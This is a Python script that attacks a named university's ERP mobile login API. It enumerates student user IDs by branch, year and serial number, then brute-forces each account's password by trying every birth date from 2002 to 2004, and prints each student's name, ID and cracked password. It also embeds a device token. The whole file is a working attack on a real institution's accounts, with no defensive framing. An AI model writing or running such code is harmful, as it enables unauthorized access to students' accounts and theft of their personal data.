from requests import Session

BASE_URL = "https://erp.iith.ac.in/MobileAPI/"

LOGIN_PATH = "GetMobileAppValidatePassword"

req = Session()

def get_user_pwd():
    global body

    data = req.post(BASE_URL + LOGIN_PATH, json=body).json()[0]
    if data["errorId"] == 1 and data["errorMessage"] == "User ID Not found":
        return 1

    for yyyy in [2003, 2004, 2002]:
        for mm in range(1, 13):
            for dd in range(1, 32):
                body["Password"] = f"{dd:02d}{mm:02d}{yyyy}"

                data = req.post(BASE_URL + LOGIN_PATH, json=body).json()[0]
                if data["errorId"] == 0:
                    print(f"{data['referenceId']}, {data['studentName']}, {body['UserID']}, {body['Password']}")
                    return 0
    
    return 2


def get_user_id():
    global body
    
    for degree in degrees:
        for year in years:
            for branch in branches:
                for sno in range(11001, 11101):
                    body["UserID"] = f"{branch}{year}{degree}{sno}"
                    if get_user_pwd() == 1:
                        break


if __name__ == "__main__":

    body = {
        "UserID": "",
        "DeviceType": "android",
        "FCMID" : "9uTC82PwTddsX7-l9My0M9:gQphngqrimY8RNWS3IPzZF4w9g-OU4FNwDpWPNmCQcF0sodLFZyuhU5JOI36faxcOT5f6roRi6oVHgVrprfht5kEMW6ei7LdeuPVlZ4wWHclEZhT2LTjh27ZDut8AcNB01kuz3vEdnpC,OS:33,Model:SM-M325F,BRAND:samsung,MANUFACTURER:samsung,Build ID:TP1A.220624.014",
        "Password": ""
    }

    degrees = ["btech"] #, "mtech", "resch"]
    years = [21, 22, 23, 24]
    branches = ["ai", "bm", "bt", "ce", "ch", "co", "cs", "ee", "ep", "es", "ic", "ma", "me", "ms"]

    try :
        get_user_id()
    except KeyboardInterrupt:
        pass
